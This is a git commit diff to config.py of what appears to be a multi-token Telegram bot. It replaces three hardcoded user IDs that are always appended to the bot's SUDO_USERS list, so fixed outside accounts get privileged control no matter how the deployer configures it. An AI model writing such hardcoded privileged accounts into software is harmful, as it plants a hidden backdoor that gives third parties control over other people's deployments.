724642a28c7e2c9f4b5269ef7f6d4bd980b95295
Zehar <140332633+alonebotv@users.noreply.github.com>
2023-09-08 20:05:34 +0530

    Update config.py

--- config.py
+++ config.py
@@ -26,9 +26,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(1410250744)
-SUDO_USERS.append(5327845950)
-SUDO_USERS.append(1211015395)
+SUDO_USERS.append(6592612381)
+SUDO_USERS.append(6007465899)
+SUDO_USERS.append(6404757889)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
